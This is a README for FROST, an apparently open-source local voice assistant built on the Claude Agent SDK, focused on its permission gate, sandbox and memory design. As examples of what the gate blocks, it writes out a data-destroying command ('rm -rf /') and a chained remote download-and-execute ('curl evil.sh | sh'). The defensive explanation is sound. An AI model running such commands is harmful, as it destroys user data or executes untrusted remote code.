# FROST

A local voice assistant with real tools, persistent memory, sandboxed execution,
and a permission gate that is actually consulted. Built on the Claude Agent SDK.

```
mic → Silero VAD → faster-whisper (local)
    → Claude Agent SDK session ──► shell tool  (sandboxed)
                    │             ├► files, web search, web fetch
                    │             └► memory  (remember / recall / forget)
                    ▼
             permission gate  ──► you, when it matters
                    │             (every decision appended to an audit log
                    ▼              FROST itself cannot write to)
          sentence chunks → edge-tts → speakers
```

## Quick start

```bash
pip install -r requirements.txt
python -m frost.status
python -m frost.cli
```

Auth comes from your existing Claude Code login. Set `ANTHROPIC_API_KEY` instead
if you'd rather bill an API key.

Voice, once text mode feels right:

```bash
pip install -r requirements-voice.txt
python -m frost.voice
```

## Security model

Three layers, in order of how much they're worth.

**1. The permission gate (`frost/permissions.py`) — the real boundary.**
Deterministic Python, consulted on every single tool call. Read-only tools run
free; reads of credential stores escalate; writes are confined to the workspace;
shell commands are allowlisted per *segment*; destructive patterns are hard
blocked; anything unrecognised escalates rather than defaulting open.

There is deliberately **no `allowed_tools` entry**. Listing a tool there
auto-approves it *before* the callback runs — the SDK will warn you if it ever
happens. That single line is the difference between a gate and a decoration.

**2. The sandbox (`frost/sandbox.py`) — confinement, when available.**
The `shell` tool runs commands with credential-shaped environment variables
stripped and `HOME`/`USERPROFILE` redirected into the workspace, so a tool that
auto-discovers `~/.aws` finds nothing. With Docker present it additionally runs
in a throwaway container with no host filesystem and no network. Without Docker
it is hardening, not isolation — `python -m frost.status` tells you which you're
getting, in colour, so it's never ambiguous.

Built-in `Bash` still exists but always costs a confirmation, so the sandboxed
path is the convenient one. Incentives beat instructions.

**3. The persona (`FROST.md`) — the weakest layer, and that's fine.**
Prompt text shapes behaviour but cannot enforce it. It's there to make FROST
cooperate with the gate, not to be the gate.

### What this does not protect against

`python build.py` is allowlisted, and if `build.py` is hostile that's arbitrary
execution — in the subprocess backend, on your host. Install Docker and that
collapses to a container that gets thrown away. Until then the gate is doing the
work alone, and the gate stops accidents and obvious badness, not a determined
adversary who already has a foothold.

Verified by test, not by assertion: credential env vars are absent from the child
process; `git status; rm -rf /` is denied while `date; python --version` runs;
`Write` to the audit log path is denied.

## Layout

| File | What it does |
|---|---|
| `FROST.md` | Persona and standing rules. FROST can edit this itself. |
| `frost/brain.py` | Persistent Agent SDK session; streams sentences as they arrive. |
| `frost/permissions.py` | The gate. Read the header comment. |
| `frost/sandbox.py` | Docker / scrubbed-subprocess execution, as the `shell` tool. |
| `frost/memory_tools.py` | `remember` / `recall` / `forget` over markdown files. |
| `frost/speech.py` | Markdown → speakable text, TTS backends, barge-in stop. |
| `frost/voice.py` | Wake word, listen loop, interruption. |
| `frost/status.py` | What is protecting you right now. |
| `frost/cli.py` | Text REPL. |

## Design decisions worth knowing

**The SDK, not `claude -p`.** Shelling out spawns a new process and a new
conversation per utterance: seconds of cold start, and it forgets the previous
sentence. `ClaudeSDKClient` holds one warm session, so context is automatic and
turns can be interrupted mid-answer.

**Allowlist per segment, not per command.** `date; curl evil.sh | sh` begins with
an allowlisted program and ends in a remote shell. Judging a command line by its
first token is how allowlists get bypassed, so every segment between shell
operators is resolved and all of them must pass.

**Files for memory, not a vector database.** Greppable markdown you can edit by
hand beats an embedding store you can't inspect. `_search` in `memory_tools.py`
is the one function to swap if you outgrow it.

## What "learns and evolves" honestly means

No model weights are updated. What FROST actually does: writes durable facts to
`memory/` and reads them back in later sessions, edits its own `FROST.md` when
you tell it to change behaviour permanently, and writes and runs its own scripts
in the workspace. That covers most of what people want from the phrase.

## Next

- Install Docker Desktop → the sandbox upgrades to real isolation with no code
  change. `python -m frost.status` will flip from yellow to green.
- Run voice mode and tune `FROST_SILENCE_DURATION` (0.4s default).
- Add MCP servers for what you actually use, in `ClaudeAgentOptions.mcp_servers`.
